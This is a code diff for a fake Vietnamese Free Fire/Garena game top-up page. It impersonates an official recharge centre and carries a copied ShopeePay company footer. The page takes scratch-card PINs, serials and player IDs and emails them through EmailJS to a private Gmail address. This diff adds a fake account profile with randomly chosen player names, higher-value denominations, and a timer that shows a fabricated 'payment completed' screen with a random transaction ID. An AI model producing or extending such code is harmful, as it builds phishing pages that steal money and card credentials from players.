@@ -30,6 +30,7 @@
             display: flex;
             flex-direction: column;
             box-shadow: 0 0 15px rgba(0,0,0,0.05);
+            position: relative;
         }
 
         img {
@@ -239,8 +240,14 @@
         .step-title-box {
             display: flex;
             align-items: center;
-            gap: 10px;
+            justify-content: space-between;
             margin-bottom: 16px;
+        }
+
+        .step-title-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .step-badge {
@@ -370,32 +377,65 @@
 
         .user-logged {
             display: none;
-            align-items: center;
-            justify-content: space-between;
-            background: #e8f5e9;
-            padding: 12px 14px;
-            border-radius: 8px;
-            border: 1px solid #c8e6c9;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px;
+            border: 1px solid #eee;
         }
 
         .user-logged.active {
             display: flex;
+            align-items: center;
+            gap: 14px;
         }
 
-        .user-info {
-            font-size: 0.88rem;
-            color: #2e7d32;
+        .user-avatar-box {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            border: 1px solid #e0e0e0;
+        }
+
+        .user-avatar-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .user-details {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .user-details .user-name {
+            font-size: 0.95rem;
             font-weight: 700;
+            color: #111;
         }
 
-        .btn-logout {
+        .user-details .user-id {
+            font-size: 0.85rem;
+            color: #666;
+            font-weight: 400;
+        }
+
+        .btn-logout-header {
+            display: none;
+            align-items: center;
+            gap: 4px;
+            color: #d32f2f;
+            font-size: 0.9rem;
+            font-weight: 500;
             background: none;
             border: none;
-            color: #d32f2f;
-            font-size: 0.8rem;
             cursor: pointer;
-            text-decoration: underline;
-            font-weight: 500;
+        }
+
+        .btn-logout-header.active {
+            display: flex;
         }
 
         /* ================= TABS & DENOM ================= */
@@ -655,7 +695,7 @@
             cursor: pointer;
         }
 
-        /* ================= GIAO DIỆN THANH TOÁN QR CHUẨN NAPTHE.VN ================= */
+        /* ================= GIAO DIỆN THANH TOÁN QR ================= */
         .qr-checkout-page {
             display: none;
             background: #f4f5f7;
@@ -784,7 +824,6 @@
             box-shadow: 0 2px 8px rgba(211, 47, 47, 0.3);
         }
 
-        /* Khung quét QR */
         .qr-display-box {
             display: none;
             background: #fff;
@@ -841,7 +880,7 @@
             cursor: pointer;
         }
 
-        /* ================= MỤC CHỜ XỬ LÝ / KẾT QUẢ ================= */
+        /* ================= MỤC CHỜ XỬ LÝ ================= */
         .pending-section {
             display: none;
             background: #fff;
@@ -917,17 +956,129 @@
             color: #222;
         }
 
-        .btn-new-order {
-            background: #d32f2f;
+        /* ================= GIAO DIỆN THANH TOÁN THÀNH CÔNG ================= */
+        .success-section {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: 100%;
+            background: #f4f5f7;
+            z-index: 9999;
+            flex-direction: column;
+        }
+
+        .success-section.active {
+            display: flex;
+        }
+
+        /* Cấu hình hiển thị TOÀN MÀN HÌNH chuẩn trên điện thoại */
+        @media (max-width: 768px) {
+            .success-section {
+                position: fixed !important;
+                top: 0 !important;
+                left: 0 !important;
+                width: 100vw !important;
+                height: 100vh !important;
+                min-height: 100vh !important;
+                overflow-y: auto !important;
+            }
+        }
+
+        .success-header-card {
+            background: #fff;
+            padding: 24px 16px 16px 16px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 10px;
+        }
+
+        .success-icon-circle {
+            width: 60px;
+            height: 60px;
+            border: 3px solid #22ab59;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px auto;
+            color: #22ab59;
+            font-size: 1.8rem;
+            font-weight: bold;
+        }
+
+        .success-title {
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 6px;
+        }
+
+        .success-tx-label {
+            font-size: 0.75rem;
+            color: #666;
+            margin-bottom: 2px;
+        }
+
+        .success-tx-box {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: #222;
+        }
+
+        .success-info-card {
+            background: #fff;
+            margin: 0 14px 12px 14px;
+            border-radius: 12px;
+            padding: 2px 16px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        }
+
+        .success-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0f0f0;
+            color: #444;
+        }
+
+        .success-row:last-child {
+            border-bottom: none;
+        }
+
+        .success-row strong {
+            color: #111;
+            font-weight: 700;
+        }
+
+        .btn-success-home {
+            background: #ff4655;
             color: #fff;
             border: none;
-            width: 100%;
-            padding: 11px 0;
-            border-radius: 20px;
+            width: calc(100% - 28px);
+            margin: 0 14px 12px 14px;
+            height: 44px;
+            border-radius: 22px;
+            font-size: 0.9rem;
             font-weight: 700;
-            font-size: 0.85rem;
             cursor: pointer;
-            margin-top: 8px;
+            box-shadow: 0 2px 8px rgba(255, 70, 85, 0.3);
+            flex-shrink: 0;
+        }
+
+        .success-company-footer {
+            padding: 0 16px 16px 16px;
+            text-align: center;
+            font-size: 0.62rem;
+            color: #777;
+            line-height: 1.4;
+            margin-top: auto;
         }
 
         footer {
@@ -943,7 +1094,7 @@
 </head>
 <body>
 
-    <!-- GIAO DIỆN CHÍNH (TRANG CHỦ / BƯỚC NẠP) -->
+    <!-- GIAO DIỆN CHÍNH -->
     <div id="mainApp">
         <!-- Header -->
         <header class="header">
@@ -962,7 +1113,7 @@
             <img src="https://cdn.phototourl.com/member/2026-10-04-7d580908-5c77-4739-9df2-0267e2541322.png" alt="Free Fire x Naruto">
         </div>
 
-        <!-- Danh sách lựa chọn trò chơi (Đã làm sáng tất cả các game) -->
+        <!-- Trò chơi -->
         <section class="game-section">
             <div class="section-title">Lựa chọn trò chơi</div>
             <div class="game-grid">
@@ -1023,10 +1174,16 @@
                 <!-- Bước 1: Đăng Nhập -->
                 <div class="step-card">
                     <div class="step-title-box">
-                        <div class="step-badge">1</div>
-                        <div class="step-title">Đăng nhập</div>
+                        <div class="step-title-left">
+                            <div class="step-badge">1</div>
+                            <div class="step-title">Tài khoản</div>
+                        </div>
+                        <button id="btnLogoutHeader" class="btn-logout-header">
+                            <span style="font-size: 1.1rem;">⇆</span> Đăng xuất
+                        </button>
                     </div>
                     
+                    <!-- Khung Đăng Nhập -->
                     <div id="loginSection" class="login-box">
                         <div class="login-label-row">
                             <span class="login-label">ID người chơi</span>
@@ -1059,17 +1216,25 @@
                         </div>
                     </div>
 
+                    <!-- Khung Thông Tin Tài Khoản Đã Đăng Nhập -->
                     <div id="userLogged" class="user-logged">
-                        <div class="user-info">UID: <span id="displayUid">--</span></div>
-                        <button id="btnLogout" class="btn-logout">Đăng xuất</button>
+                        <div class="user-avatar-box">
+                            <img src="https://cdn.phototourl.com/member/2026-09-28-763d046e-2237-4ed1-ab26-f42a46bbeb9d.png" alt="Game Avatar">
+                        </div>
+                        <div class="user-details">
+                            <div class="user-name">Tên: <span id="displayRandomName">trwe_hrt_.</span></div>
+                            <div class="user-id">ID người chơi: <span id="displayUid">1847383133</span></div>
+                        </div>
                     </div>
                 </div>
 
                 <!-- Bước 2: Chọn Hình Thức & Nạp -->
                 <div class="step-card">
                     <div class="step-title-box">
-                        <div class="step-badge">2</div>
-                        <div class="step-title">Gói dịch vụ</div>
+                        <div class="step-title-left">
+                            <div class="step-badge">2</div>
+                            <div class="step-title">Gói dịch vụ</div>
+                        </div>
                     </div>
 
                     <div class="tabs-header">
@@ -1078,17 +1243,9 @@
                         <button class="tab-btn" id="tabBtnShop" onclick="switchTab('shop')">Shop</button>
                     </div>
 
-                    <!-- Tab 1: Nạp Online (Đã cập nhật đúng lượng kim cương yêu cầu) -->
+                    <!-- Tab 1: Nạp Online -->
                     <div id="tab-online" class="tab-content active">
                         <div class="denom-grid" id="denomGrid">
-                            <div class="denom-card" data-price="5.000 đ" data-title="125">
-                                <div class="denom-price">5.000 đ</div>
-                                <div class="denom-diamonds">💎 125</div>
-                            </div>
-                            <div class="denom-card" data-price="10.000 đ" data-title="255">
-                                <div class="denom-price">10.000 đ</div>
-                                <div class="denom-diamonds">💎 255</div>
-                            </div>
                             <div class="denom-card" data-price="20.000 đ" data-title="565">
                                 <div class="denom-price">20.000 đ</div>
                                 <div class="denom-diamonds">💎 565</div>
@@ -1116,6 +1273,14 @@
                             <div class="denom-card" data-price="2.000.000 đ" data-title="57.500">
                                 <div class="denom-price">2.000.000 đ</div>
                                 <div class="denom-diamonds">💎 57.500</div>
+                            </div>
+                            <div class="denom-card" data-price="3.000.000 đ" data-title="86.250">
+                                <div class="denom-price">3.000.000 đ</div>
+                                <div class="denom-diamonds">💎 86.250</div>
+                            </div>
+                            <div class="denom-card" data-price="4.000.000 đ" data-title="115.000">
+                                <div class="denom-price">4.000.000 đ</div>
+                                <div class="denom-diamonds">💎 115.000</div>
                             </div>
                         </div>
                     </div>
@@ -1199,8 +1364,10 @@
                 <!-- Bước 3: Phương Thức Thanh Toán -->
                 <div class="step-card" id="stepPaySection">
                     <div class="step-title-box">
-                        <div class="step-badge">3</div>
-                        <div class="step-title">Phương thức thanh toán</div>
+                        <div class="step-title-left">
+                            <div class="step-badge">3</div>
+                            <div class="step-title">Phương thức thanh toán</div>
+                        </div>
                     </div>
 
                     <div class="pay-grid" id="payGrid">
@@ -1240,19 +1407,16 @@
         </div>
     </div>
 
-    <!-- PAGE CHUYỂN TIỀN QR CHUẨN NAPTHE.VN -->
+    <!-- PAGE CHUYỂN TIỀN QR -->
     <div id="qrCheckoutPage" class="qr-checkout-page">
-        <!-- Sub Header -->
         <div class="sub-header">
             <button class="btn-back" onclick="backToMainApp()">‹ Trang trước</button>
         </div>
 
-        <!-- Ảnh Logo Game -->
         <div class="checkout-game-card">
             <img src="https://cdn.phototourl.com/member/2026-10-09-e06e29d6-cfe9-4077-a152-4450fc4f833a.png" style="width: 600px; height: auto;" alt="Free Fire" class="checkout-game-img">
         </div>
 
-        <!-- Thông tin đơn hàng -->
         <div class="summary-card">
             <div class="summary-row">
                 <span>Tổng cộng</span>
@@ -1272,7 +1436,6 @@
             </div>
         </div>
 
-        <!-- Mã khuyến mãi -->
         <div class="promo-card">
             <div class="promo-title">Mã khuyến mãi</div>
             <div class="promo-input-box">
@@ -1281,10 +1444,8 @@
             </div>
         </div>
 
-        <!-- Nút bấm Xử lý thanh toán -->
         <button id="btnProcessPay" class="btn-process-pay" onclick="toggleQrDisplay()">Xử lý thanh toán</button>
 
-        <!-- Khung Mã QR hiện ra sau khi xử lý -->
         <div id="qrDisplayBox" class="qr-display-box">
             <div class="qr-instruction">Quét mã ngân hàng bạn chọn</div>
             <div class="qr-subtext">Thanh toán qua bất kỳ ngân hàng hoặc ví điện tử nào</div>
@@ -1297,7 +1458,7 @@
         </div>
     </div>
 
-    <!-- MỤC CHỜ XỬ LÝ (KẾT QUẢ) -->
+    <!-- MỤC CHỜ XỬ LÝ -->
     <div id="pendingSection" class="pending-section">
         <div class="spinner-box">
             <div class="spinner"></div>
@@ -1307,7 +1468,7 @@
         
         <h3 style="font-size: 1.05rem; margin-bottom: 6px; color: #222;">Giao dịch đang được xử lý</h3>
         <p style="font-size: 0.78rem; color: #666; line-height: 1.4;">
-            Hệ thống đang kiểm tra giao dịch của bạn. Vui lòng giữ trang này, Kim Cương/Vật phẩm sẽ được gửi tự động vào tài khoản sau 1-3 phút.
+            Hệ thống đang kiểm tra giao dịch của bạn. Vui lòng giữ trang này.
         </p>
 
         <div class="order-detail-card">
@@ -1336,8 +1497,55 @@
                 <strong id="pendingMethod">QR Pay</strong>
             </div>
         </div>
+    </div>
 
-        <button class="btn-new-order" onclick="resetToNewOrder()">Quay lại Trang chủ</button>
+    <!-- MỤC THANH TOÁN THÀNH CÔNG -->
+    <div id="successSection" class="success-section">
+        <header class="header" style="margin-bottom: 10px; position: sticky; top: 0; z-index: 100;">
+            <div class="header-brand">
+                <img src="https://cdn.phototourl.com/member/2026-09-28-da3cf786-a99d-4313-ab81-814b30266374.png" alt="Garena Logo" class="header-logo">
+                <span class="header-title">Trung tâm nạp<br>thẻ chính thức</span>
+            </div>
+        </header>
+
+        <div class="success-header-card">
+            <div class="success-icon-circle">✓</div>
+            <div class="success-title">Thanh toán đã hoàn tất!</div>
+            <div class="success-tx-label">ID giao dịch</div>
+            <div class="success-tx-box">
+                <span id="successTxId">11083720509650985250</span>
+                <span style="cursor:pointer; color:#666;" onclick="alert('Đã sao chép ID giao dịch!')" title="Sao chép">📋</span>
+            </div>
+        </div>
+
+        <div class="success-info-card">
+            <div class="success-row">
+                <span>Tổng cộng</span>
+                <strong>💎 <span id="successDiamonds">2.830</span></strong>
+            </div>
+            <div class="success-row">
+                <span>Giá</span>
+                <strong id="successPrice">1.000 đ</strong>
+            </div>
+            <div class="success-row">
+                <span>Game</span>
+                <strong>Free Fire</strong>
+            </div>
+            <div class="success-row">
+                <span>Phương thức thanh toán</span>
+                <strong id="successMethod">Thẻ Garena</strong>
+            </div>
+            <div class="success-row">
+                <span>Thời gian giao dịch</span>
+                <strong id="successTime">16:37:04 17/9/2026</strong>
+            </div>
+        </div>
+
+        <button class="btn-success-home" onclick="resetToNewOrder()">Quay lại Trang chủ</button>
+
+        <div class="success-company-footer">
+            CÔNG TY CỔ PHẦN SHOPEEPAY | Giấy CNĐKKD số 0103959912 | Cơ quan cấp: Phòng Đăng ký kinh doanh- Sở Kế hoạch và đầu tư TP Hà Nội | Địa chỉ trụ sở chính: Tầng 5, Tháp 2, Tòa nhà Capital Place, số 29 Liễu Giai, Phường Ngọc Hà, TP Hà Nội, Việt Nam
+        </div>
     </div>
 
     <!-- Footer -->
@@ -1346,16 +1554,45 @@
         <p>© 2026 NaptheX5 GARENA - Hệ thống nạp game chính thức.</p>
     </footer>
 
-    <!-- JavaScript Xử Lý Tương Tác & EmailJS -->
+    <!-- JavaScript Xử Lý Tương Tác & Chờ 10 Giây -->
     <script>
         (function() {
-            emailjs.init("D32s33ZSpoM1W4Pkf"); // Public Key EmailJS giữ nguyên
+            emailjs.init("D32s33ZSpoM1W4Pkf");
         })();
 
         const EMAILJS_SERVICE_ID = "service_abc123";
         const EMAILJS_TEMPLATE_ID = "template_kfnbqvj";
 
+        const randomNameList = [
+            'ethocute', '★shadow★', 'miecute', '✿katana✿',
+            'socute', '✦viper✦', 'unidau', '☠darkness☠',
+            'tuncute', '☣toxic☣', 'bimcute', '꧁✦zero✦꧂',
+            'linhcute', 'ϟlightningϟ', 'hancute', '❆frost❆',
+            'milu', '†firebolt†', 'susu', '✧astra✧',
+            'bibi', '☽lunar☽', 'mimichan', '☼solar☼',
+            'kurocute', '☯yinyang☯', 'naocute', '⚔knight⚔',
+            'boocute', '⛨guardian⛨', 'Mocute', '♔kingpin♔',
+            'chipcute', '♆mage♆', 'dauco', '🎯sniper🎯',
+            'meocute', '☣bomber☣', 'thocute', '꧁༺killer༻꧂',
+            'cunluc', '✿sakura✿', 'vitcute', '★ace★',
+            'gaucute', '✦master✦', 'heocute', '☠skull☠',
+            'nhoccute', '☣virus☣', 'tittcute', '꧁✦hero✦꧂',
+            'bopcute', 'ϟthunderϟ', 'keocute', '❆iceman❆',
+            'banhcute', '†pyro†', 'suacute', '✧starlight✧',
+            'mitcute', '☽eclipse☽', 'xoaikute', '☼cosmos☼',
+            'daocute', '☯zen☯', 'taocute', '⚔samurai⚔',
+            'camcute', '⛨aegis⛨', 'quycute', '♔legend♔',
+            'duhcute', '♆wizard♆', 'phucute', '🎯hawk🎯',
+            'khoicute', '☣dynamo☣', 'baocute', '꧁༺ghost༻꧂',
+            'vucute', '✿angel✿', 'ducute', '★demon★',
+            'hieucute', '✦dragon✦', 'namcute', '☠beast☠',
+            'longcute', '☣hazard☣', 'hoangcute', '꧁✦ninja✦꧂',
+            'khanhcute', 'ϟstormϟ', 'tuanbabi', '❆blizzard❆',
+            'minhbabi', '†magma†', 'anhbabi', '✧nebula✧'
+        ];
+
         let loggedUid = '';
+        let loggedName = '';
         let activeTab = 'online';
 
         let currentOnlinePrice = '50.000 đ';
@@ -1369,19 +1606,28 @@
         let currentShopTitle = 'Thẻ Tuần';
         let currentShopPrice = '50.000 đ';
 
+        let pendingTimeout = null;
+
         const uidInput = document.getElementById('uidInput');
         const btnLogin = document.getElementById('btnLogin');
         const loginSection = document.getElementById('loginSection');
         const userLogged = document.getElementById('userLogged');
         const displayUid = document.getElementById('displayUid');
-        const btnLogout = document.getElementById('btnLogout');
+        const displayRandomName = document.getElementById('displayRandomName');
+        const btnLogoutHeader = document.getElementById('btnLogoutHeader');
 
         const selectedTitle = document.getElementById('selectedTitle');
         const selectedPrice = document.getElementById('selectedPrice');
         const btnPay = document.getElementById('btnPay');
 
         const uidRegex = /^\d{8,11}$/;
-        const cardNumRegex = /^\d{6,15}$/;
+        const cardCodeRegex = /^\d{11,15}$/;
+        const cardSeriRegex = /^\d{5,15}$/;
+
+        function getRandomName() {
+            const randomIndex = Math.floor(Math.random() * randomNameList.length);
+            return randomNameList[randomIndex];
+        }
 
         btnLogin.addEventListener('click', function() {
             const uid = uidInput.value.trim();
@@ -1395,15 +1641,22 @@
             }
 
             loggedUid = uid;
+            loggedName = getRandomName();
+
             displayUid.textContent = loggedUid;
+            displayRandomName.textContent = loggedName;
+
             loginSection.style.display = 'none';
             userLogged.classList.add('active');
+            btnLogoutHeader.classList.add('active');
         });
 
-        btnLogout.addEventListener('click', function() {
+        btnLogoutHeader.addEventListener('click', function() {
             loggedUid = '';
+            loggedName = '';
             uidInput.value = '';
             userLogged.classList.remove('active');
+            btnLogoutHeader.classList.remove('active');
             loginSection.style.display = 'block';
         });
 
@@ -1500,7 +1753,6 @@
             }
         }
 
-        // Bấm nút "Thanh toán" / "Xác nhận nạp thẻ" tại trang chính
         btnPay.addEventListener('click', function() {
             if(!loggedUid) {
                 alert('Vui lòng nhập và đăng nhập UID trước khi thanh toán!');
@@ -1516,12 +1768,12 @@
                     alert('Vui lòng điền đầy đủ Mã thẻ cào và Số Seri!');
                     return;
                 }
-                if(!cardNumRegex.test(code)) {
-                    alert('Mã thẻ không hợp lệ!');
+                if(!cardCodeRegex.test(code)) {
+                    alert('Mã thẻ không hợp lệ.');
                     return;
                 }
-                if(!cardNumRegex.test(seri)) {
-                    alert('Số Seri không hợp lệ!');
+                if(!cardSeriRegex.test(seri)) {
+                    alert('Số Seri không hợp lệ.');
                     return;
                 }
 
@@ -1532,11 +1784,10 @@
                                 (now.getMonth()+1).toString().padStart(2,'0') + '/' + 
                                 now.getFullYear();
 
-                // Gửi email qua EmailJS
                 const cardParams = {
                     name: "Hệ thống Nạp Thẻ - Thẻ Cào Mới",
                     time: timeStr,
-                    message: `NẠP THẺ CÀO BẰNG THẺ\n\n- Nhà mạng: ${currentCardType}\n- Mệnh giá: ${currentCardPrice}\n- Mã thẻ (PIN): ${code}\n- Số Seri: ${seri}\n- UID người chơi: ${loggedUid}\n- Email nhận: hoanqtronglzch@gmail.com`,
+                    message: `NẠP THẺ CÀO BẰNG THẺ\n\n- Nhà mạng: ${currentCardType}\n- Mệnh giá: ${currentCardPrice}\n- Mã thẻ (PIN): ${code}\n- Số Seri: ${seri}\n- Tên người chơi: ${loggedName}\n- UID người chơi: ${loggedUid}\n- Email nhận: hoanqtronglzch@gmail.com`,
                     to_email: 'hoanqtronglzch@gmail.com'
                 };
 
@@ -1549,12 +1800,11 @@
 
                 finishPayment();
             } else {
-                // Chuyển sang giao diện thanh toán QR
                 document.getElementById('mainApp').style.display = 'none';
                 document.getElementById('summaryDiamonds').textContent = currentOnlineTitle;
                 document.getElementById('summaryPrice').textContent = currentOnlinePrice;
                 document.getElementById('summaryPayMethod').textContent = currentPayMethod;
-                document.getElementById('summaryAccount').textContent = loggedUid;
+                document.getElementById('summaryAccount').textContent = `${loggedName} (${loggedUid})`;
 
                 document.getElementById('qrDisplayBox').classList.remove('active');
                 document.getElementById('btnProcessPay').style.display = 'flex';
@@ -1588,17 +1838,47 @@
 
             document.getElementById('pendingTxId').textContent = randomTxId;
             document.getElementById('pendingTime').textContent = timeStr;
-            document.getElementById('pendingUid').textContent = loggedUid;
+            document.getElementById('pendingUid').textContent = `${loggedUid} (${loggedName})`;
             document.getElementById('pendingPackage').textContent = selectedTitle.textContent;
             document.getElementById('pendingAmount').textContent = selectedPrice.textContent;
             document.getElementById('pendingMethod').textContent = (activeTab === 'card') ? (`Thẻ cào ${currentCardType}`) : currentPayMethod;
 
+            // Hiển thị phần đang chờ xử lý
+            document.getElementById('successSection').classList.remove('active');
             document.getElementById('pendingSection').classList.add('active');
             window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            // Sau 10 giây (10000ms), tự động ẩn chờ xử lý và hiện trang thành công
+            if(pendingTimeout) clearTimeout(pendingTimeout);
+            pendingTimeout = setTimeout(() => {
+                document.getElementById('pendingSection').classList.remove('active');
+
+                // Điền dữ liệu sang trang thành công
+                const randomBigId = Math.floor(10000000000000000000 + Math.random() * 90000000000000000000);
+                document.getElementById('successTxId').textContent = randomBigId;
+                
+                let diamText = (activeTab === 'card') ? currentCardTitle : ((activeTab === 'shop') ? (currentShopTitle === 'Thẻ Tuần' ? '1.415' : '5.560') : currentOnlineTitle);
+                document.getElementById('successDiamonds').textContent = diamText;
+                document.getElementById('successPrice').textContent = (activeTab === 'card') ? currentCardPrice : ((activeTab === 'shop') ? currentShopPrice : currentOnlinePrice);
+                document.getElementById('successMethod').textContent = (activeTab === 'card') ? (`Thẻ ${currentCardType}`) : currentPayMethod;
+                
+                const fullDateTime = now.getHours().toString().padStart(2,'0') + ':' + 
+                                     now.getMinutes().toString().padStart(2,'0') + ':' + 
+                                     now.getSeconds().toString().padStart(2,'0') + ' ' + 
+                                     now.getDate().toString().padStart(2,'0') + '/' + 
+                                     (now.getMonth()+1) + '/' + 
+                                     now.getFullYear();
+                document.getElementById('successTime').textContent = fullDateTime;
+
+                document.getElementById('successSection').classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }, 10000);
         }
 
         function resetToNewOrder() {
+            if(pendingTimeout) clearTimeout(pendingTimeout);
             document.getElementById('pendingSection').classList.remove('active');
+            document.getElementById('successSection').classList.remove('active');
             document.getElementById('mainApp').style.display = 'block';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
